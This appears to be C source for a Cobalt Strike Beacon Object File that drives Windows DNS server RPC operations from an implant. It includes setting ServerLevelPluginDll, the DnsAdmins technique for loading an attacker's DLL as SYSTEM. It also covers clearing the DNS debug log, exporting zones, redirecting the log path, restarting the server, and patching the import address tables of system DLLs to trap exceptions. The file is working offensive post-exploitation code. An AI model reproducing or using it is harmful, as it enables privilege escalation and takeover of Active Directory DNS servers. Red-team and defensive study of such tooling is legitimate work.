#ifndef _DEBUG
DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf_s(wchar_t *buffer, size_t sizeOfBuffer, const wchar_t *format, ...);
DECLSPEC_IMPORT int __cdecl MSVCRT$_stricmp(const char *string1,const char *string2);
DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char *string1,const char *string2);
#endif

//
// Dedicated allocator for the RPC calls
//

void __RPC_FAR *__RPC_USER MIDL_user_allocate(size_t len)
{
    return (void*)BofHeapAlloc(len);
}

void __RPC_USER MIDL_user_free(void __RPC_FAR *ptr)
{
    BofHeapFree((void*)ptr);
}

//
// Custom functions
//

RPC_BINDING_HANDLE dnsrpc_create_binding(CONST WCHAR* server)
{
    WCHAR binding_str[MAX_PATH];
    API(MSVCRT, swprintf_s)(binding_str, MAX_PATH, L"ncacn_ip_tcp:%s", server);

    RPC_BINDING_HANDLE handle = NULL;
    RPC_STATUS status = RpcBindingFromStringBindingW((RPC_WSTR)binding_str, &handle);
    if (status != RPC_S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "RpcBindingFromStringBindingW failed: %ld\n", status);
        goto cleanup;
    }

    status = RpcEpResolveBinding(handle, DnsServer_v5_0_c_ifspec);
    if (status != RPC_S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "RpcEpResolveBinding failed: %ld\n", status);
        goto cleanup;
    }

    status = RpcBindingSetAuthInfoW(
        handle,
        NULL,
        RPC_C_AUTHN_LEVEL,
        RPC_C_AUTHN_GSS_NEGOTIATE,
        NULL,
        RPC_C_AUTHZ_NAME
    );
    
    if (status != RPC_S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "RpcBindingSetAuthInfoExW failed: %ld\n", status);
        goto cleanup;
    }

    return handle;

cleanup:
    if (handle != NULL) {
        RpcBindingFree(&handle);
    }

    return NULL;
}

VOID dnsrpc_print_exception(unsigned long error_code)
{
    switch (error_code) 
    {
        case RPC_ERR_ACCESS_DENIED:
            BeaconPrintf(CALLBACK_ERROR, "RPC exception: %lu (access denied, commonly happens if your user is not in the DnsAdmins group, or if the server can't read/write a specified path)\n", error_code);
            break;
        case RPC_ERR_INVALID_PATH:
            BeaconPrintf(CALLBACK_ERROR, "RPC exception: %lu (invalid path)\n", error_code);
            break;
        case RPC_ERR_INVALID_NAME:
            BeaconPrintf(CALLBACK_ERROR, "RPC exception: %lu (invalid name)\n", error_code);
            break;
        default:
            BeaconPrintf(CALLBACK_ERROR, "RPC exception: %lu\n", error_code);
    }
}

//
// Exception redirection back to our implant
//
// Extremely hacky but I'll explain real quick: the Microsoft RPC code uses Exceptions as control flow, however BOFs don't natively 
// support handling exceptions. So what this code does is just hook the exception handling function in the import address table right 
// before calling the actual RPC function. Then, when the RPC server raises an error (i.e.: returns a STATUS_ACESS_DENIED(5)) our function
// intercepts the exception, and jumps back to where we were.
//

typedef struct {
    PVOID ExceptionList;
    PVOID StackBase;
    PVOID StackLimit;
    PVOID SubSystemTib;
    PVOID FiberData;
    PVOID ArbitraryUserPointer;
    PVOID Self;
} NT_TIB_PARTIAL;

#define TebArbitraryUserPointer() (((NT_TIB_PARTIAL *)NtCurrentTeb())->ArbitraryUserPointer)

VOID WINAPI dnsrpc_exception_handler(PEXCEPTION_RECORD ExceptionRecord)
{
    DNSRPC_HOOK_CTX *ctx = (DNSRPC_HOOK_CTX *)TebArbitraryUserPointer();
    if (!ctx) {
        return;
    }

    #ifdef _VERBOSE
    BeaconPrintf(CALLBACK_OUTPUT, "[debug] Successfully intercepted exception with status code %ld, jumping back to original address..\n", exception->ExceptionCode);
    #endif

    ctx->triggered = TRUE;
    ctx->exception_code = ExceptionRecord->ExceptionCode;
    dnsrpc_unhook_exceptions(ctx);
    ctx->restore_context(&ctx->context, NULL);
}

BOOL dnsrpc_hook(LPCSTR module_name, LPCSTR *functions)
{
    HMODULE module = API(KERNEL32, LoadLibraryA)(module_name);
    if (!module) {
        return FALSE;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)module + dos->e_lfanew);
    PIMAGE_IMPORT_DESCRIPTOR import = (PIMAGE_IMPORT_DESCRIPTOR)(
        (PBYTE)module + nt->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_IMPORT
        ].VirtualAddress
    );

    while (import->Name != 0)
    {
        if (API(MSVCRT, _stricmp)((LPCSTR)((PBYTE)module + import->Name), "ntdll.dll") != 0) {
            import++;
            continue;
        }

        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PBYTE)module + import->FirstThunk);
        PIMAGE_THUNK_DATA original = (PIMAGE_THUNK_DATA)((PBYTE)module + import->OriginalFirstThunk);

        while (original->u1.AddressOfData != 0)
        {
            if (original->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                original++;
                thunk++;
                continue;
            }
            
            PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)((PBYTE)module + original->u1.AddressOfData);

            for (LPCSTR *name = functions; *name != NULL; name++)
            {
                
                if (API(MSVCRT, strcmp)((LPCSTR)ibn->Name, *name) == 0) {
                    DWORD old_protect = 0;
                    API(KERNEL32, VirtualProtect)(&thunk->u1.Function, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &old_protect);
                    thunk->u1.Function = (ULONG_PTR)dnsrpc_exception_handler;
                    API(KERNEL32, VirtualProtect)(&thunk->u1.Function, sizeof(PVOID), old_protect, &old_protect);
                    break;
                }
            }

            original++;
            thunk++;
        }

        import++;
    }

    return TRUE;
}

VOID dnsrpc_unhook(LPCSTR module_name, LPCSTR *functions)
{
    HMODULE ntdll = API(KERNEL32, LoadLibraryA)("ntdll.dll");
    HMODULE module = API(KERNEL32, LoadLibraryA)(module_name);
    if (!module)
        return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)module + dos->e_lfanew);
    PIMAGE_IMPORT_DESCRIPTOR import = (PIMAGE_IMPORT_DESCRIPTOR)(
        (PBYTE)module + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
    );

    while (import->Name != 0)
    {
        if (API(MSVCRT, _stricmp)((LPCSTR)((PBYTE)module + import->Name), "ntdll.dll") != 0) {
            import++;
            continue;
        }

        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PBYTE)module + import->FirstThunk);
        PIMAGE_THUNK_DATA original_thunk = (PIMAGE_THUNK_DATA)((PBYTE)module + import->OriginalFirstThunk);

        while (original_thunk->u1.AddressOfData != 0)
        {
            if (original_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                original_thunk++;
                thunk++;
                continue;
            }

            PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)((PBYTE)module + original_thunk->u1.AddressOfData);

            for (LPCSTR *name = functions; *name != NULL; name++)
            {
                if (API(MSVCRT, strcmp)((LPCSTR)ibn->Name, *name) == 0) {
                    FARPROC original_function = API(KERNEL32, GetProcAddress)(ntdll, *name);
                    DWORD old_protect = 0;
                    API(KERNEL32, VirtualProtect)(&thunk->u1.Function, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &old_protect);
                    thunk->u1.Function = (ULONG_PTR)original_function;
                    API(KERNEL32, VirtualProtect)(&thunk->u1.Function, sizeof(PVOID), old_protect, &old_protect);
                    break;
                }
            }

            original_thunk++;
            thunk++;
        }

        import++;
    }
}

BOOL dnsrpc_hook_exceptions(DNSRPC_HOOK_CTX *ctx)
{
    LPCSTR DNSRPC_HOOK_FUNCTIONS[] = { "RtlRaiseException", "RtlRaiseNoncontinuableException", NULL };

    dnsrpc_hook("rpcrt4.dll", DNSRPC_HOOK_FUNCTIONS);
    dnsrpc_hook("kernelbase.dll", DNSRPC_HOOK_FUNCTIONS);
    dnsrpc_hook("ucrtbase.dll", DNSRPC_HOOK_FUNCTIONS);
    dnsrpc_hook("sspicli.dll", DNSRPC_HOOK_FUNCTIONS);

    TebArbitraryUserPointer() = (PVOID)ctx;
    return TRUE;
}

VOID dnsrpc_unhook_exceptions(DNSRPC_HOOK_CTX *ctx)
{
    LPCSTR DNSRPC_HOOK_FUNCTIONS[] = { "RtlRaiseException", "RtlRaiseNoncontinuableException", NULL };

    dnsrpc_unhook("rpcrt4.dll", DNSRPC_HOOK_FUNCTIONS);
    dnsrpc_unhook("kernelbase.dll", DNSRPC_HOOK_FUNCTIONS);
    dnsrpc_unhook("ucrtbase.dll", DNSRPC_HOOK_FUNCTIONS);
    dnsrpc_unhook("sspicli.dll", DNSRPC_HOOK_FUNCTIONS);

    TebArbitraryUserPointer() = NULL;
}

DNSRPC_STATUS dnsrpc_call(DNSRPC_FUNC fn, PVOID fn_ctx)
{
    DNSRPC_HOOK_CTX hook = { 0 };
    DNSRPC_STATUS status = { 0 };

    HMODULE ntdll = API(KERNEL32, LoadLibraryA)("ntdll.dll");
    RtlCaptureContextFunc capture = (RtlCaptureContextFunc)API(KERNEL32, GetProcAddress)(ntdll, "RtlCaptureContext");
    hook.restore_context = (RtlRestoreContextFunc)API(KERNEL32, GetProcAddress)(ntdll, "RtlRestoreContext");

    capture(&hook.context);

    if (!hook.triggered) {
        if (!dnsrpc_hook_exceptions(&hook)) {
            status.rpc_status = -1;
            return status;
        }

        fn(fn_ctx);
        dnsrpc_unhook_exceptions(&hook);
    }

    status.exception = hook.exception_code;
    return status;
}

//
// Wrapped RPC function calls with our hacky Exception handler
//

VOID _dnsrpc_query_server_info_fn(PVOID param)
{
    DNSRPC_QUERY_SERVER_INFO_CTX *ctx = (DNSRPC_QUERY_SERVER_INFO_CTX *)param;
    ctx->result = R_DnssrvQuery2(
        ctx->handle,
        DNS_CLIENT_VERSION_LONGHORN,
        0,
        ctx->server,
        NULL,
        (LPBYTE)"ServerInfo",
        &ctx->type_id,
        &ctx->data
    );
}

DNSRPC_STATUS dnsrpc_query_server_info(RPC_BINDING_HANDLE handle, LPWSTR server, PULONG type_id, DNSSRV_RPC_UNION *data)
{
    DNSRPC_QUERY_SERVER_INFO_CTX ctx = { 0 };
    ctx.handle = handle;
    ctx.server = server;

    DNSRPC_STATUS status = dnsrpc_call(_dnsrpc_query_server_info_fn, &ctx);
    if (DNSRPC_THREW(status)) {
        return status;
    }

    status.rpc_status = ctx.result;
    if (!DNSRPC_OK(status)) {
        return status;
    }

    *type_id = ctx.type_id;
    *data = ctx.data;

    return status;
}

VOID _dnsrpc_restart_server_fn(PVOID param)
{
    DNSRPC_RESTART_SERVER_CTX *ctx = (DNSRPC_RESTART_SERVER_CTX *)param;
    DNSSRV_RPC_UNION data = { 0 };
    ctx->result = R_DnssrvOperation2(
        ctx->handle,
        DNS_CLIENT_VERSION_LONGHORN,
        0,
        ctx->server,
        NULL,
        0,
        (LPBYTE)"Restart",
        DNSSRV_TYPEID_NULL,
        data
    );
}

DNSRPC_STATUS dnsrpc_restart_server(RPC_BINDING_HANDLE handle, LPWSTR server)
{
    DNSRPC_RESTART_SERVER_CTX ctx = { 0 };
    ctx.handle = handle;
    ctx.server = server;

    DNSRPC_STATUS status = dnsrpc_call(_dnsrpc_restart_server_fn, &ctx);
    status.rpc_status = ctx.result;
    return status;
}


VOID _dnsrpc_zone_export_fn(PVOID param)
{
    DNSRPC_ZONE_EXPORT_CTX *ctx = (DNSRPC_ZONE_EXPORT_CTX *)param;

    DNS_RPC_ZONE_EXPORT_INFO export_info = { 0 };
    export_info.dwRpcStructureVersion = 0x00000001;
    export_info.pszZoneExportFile = (LPSTR)ctx->filename;

    DNSSRV_RPC_UNION data = { 0 };
    data.ZoneExport = &export_info;

    ctx->result = R_DnssrvOperation2(
        ctx->handle,
        DNS_CLIENT_VERSION_LONGHORN,
        0,
        ctx->server,
        (LPBYTE)ctx->zone,
        0,
        (LPBYTE)"ZoneExport",
        DNSSRV_TYPEID_ZONE_EXPORT,
        data
    );
}

DNSRPC_STATUS dnsrpc_zone_export(RPC_BINDING_HANDLE handle, LPWSTR server, LPCSTR zone, LPCSTR filename)
{
    DNSRPC_ZONE_EXPORT_CTX ctx = { 0 };
    ctx.handle = handle;
    ctx.server = server;
    ctx.zone = zone;
    ctx.filename = filename;

    DNSRPC_STATUS status = dnsrpc_call(_dnsrpc_zone_export_fn, &ctx);
    status.rpc_status = ctx.result;
    return status;
}

VOID _dnsrpc_set_log_file_path_fn(PVOID param)
{
    DNSRPC_SET_LOG_FILE_PATH_CTX *ctx = (DNSRPC_SET_LOG_FILE_PATH_CTX *)param;
    DNSSRV_RPC_UNION data = { 0 };
    data.WideString = (LPWSTR)ctx->log_path;
    ctx->result = R_DnssrvOperation2(
        ctx->handle,
        DNS_CLIENT_VERSION_LONGHORN,
        0,
        ctx->server,
        NULL,
        0,
        (LPBYTE)"LogFilePath",
        DNSSRV_TYPEID_LPWSTR,
        data
    );
}

DNSRPC_STATUS dnsrpc_set_log_file_path(RPC_BINDING_HANDLE handle, LPWSTR server, LPCWSTR log_path)
{
    DNSRPC_SET_LOG_FILE_PATH_CTX ctx = { 0 };
    ctx.handle = handle;
    ctx.server = server;
    ctx.log_path = log_path;

    DNSRPC_STATUS status = dnsrpc_call(_dnsrpc_set_log_file_path_fn, &ctx);
    status.rpc_status = ctx.result;
    return status;
}

VOID _dnsrpc_clear_debug_log_fn(PVOID param)
{
    DNSRPC_CLEAR_DEBUG_LOG_CTX *ctx = (DNSRPC_CLEAR_DEBUG_LOG_CTX *)param;
    DNSSRV_RPC_UNION data = { 0 };
    ctx->result = R_DnssrvOperation2(
        ctx->handle,
        DNS_CLIENT_VERSION_LONGHORN,
        0,
        ctx->server,
        NULL,
        0,
        (LPBYTE)"ClearDebugLog",
        DNSSRV_TYPEID_NULL,
        data
    );
}

DNSRPC_STATUS dnsrpc_clear_debug_log(RPC_BINDING_HANDLE handle, LPWSTR server)
{
    DNSRPC_CLEAR_DEBUG_LOG_CTX ctx = { 0 };
    ctx.handle = handle;
    ctx.server = server;

    DNSRPC_STATUS status = dnsrpc_call(_dnsrpc_clear_debug_log_fn, &ctx);
    status.rpc_status = ctx.result;
    return status;
}

VOID _dnsrpc_set_plugin_dll_fn(PVOID param)
{
    DNSRPC_SET_PLUGIN_DLL_CTX *ctx = (DNSRPC_SET_PLUGIN_DLL_CTX *)param;
    DNSSRV_RPC_UNION data = { 0 };
    data.WideString = (LPWSTR)ctx->dll_path;
    ctx->result = R_DnssrvOperation2(
        ctx->handle,
        DNS_CLIENT_VERSION_LONGHORN,
        0,
        ctx->server,
        NULL,
        0,
        (LPBYTE)"ServerLevelPluginDll",
        DNSSRV_TYPEID_LPWSTR,
        data
    );
}

DNSRPC_STATUS dnsrpc_set_plugin_dll(RPC_BINDING_HANDLE handle, LPWSTR server, LPCWSTR dll_path)
{
    DNSRPC_SET_PLUGIN_DLL_CTX ctx = { 0 };
    ctx.handle = handle;
    ctx.server = server;
    ctx.dll_path = dll_path ? dll_path : L"";

    DNSRPC_STATUS status = dnsrpc_call(_dnsrpc_set_plugin_dll_fn, &ctx);
    status.rpc_status = ctx.result;
    return status;
}

//
// Data conversion utilities
//

LPCWSTR dnsrpc_boot_method_to_string(DWORD method)
{
    switch (method)
    {
        case DNS_BOOT_METHOD_UNINITIALIZED:
            return L"uninitialized";
        case DNS_BOOT_METHOD_FILE:
            return L"file";
        case DNS_BOOT_METHOD_REGISTRY:
            return L"registry";
        case DNS_BOOT_METHOD_DIRECTORY:
            return L"directory";
        default:
            return L"unknown";
    }
}

LPCWSTR dnsrpc_structure_version_to_string(DWORD version)
{
    switch (version)
    {
        case DNS_RPC_STRUCTURE_VERSION_DOTNET:
            return L"dotnet";
        case DNS_RPC_STRUCTURE_VERSION_LONGHORN:
            return L"longhorn";
        default:
            return L"unknown";
    }
}

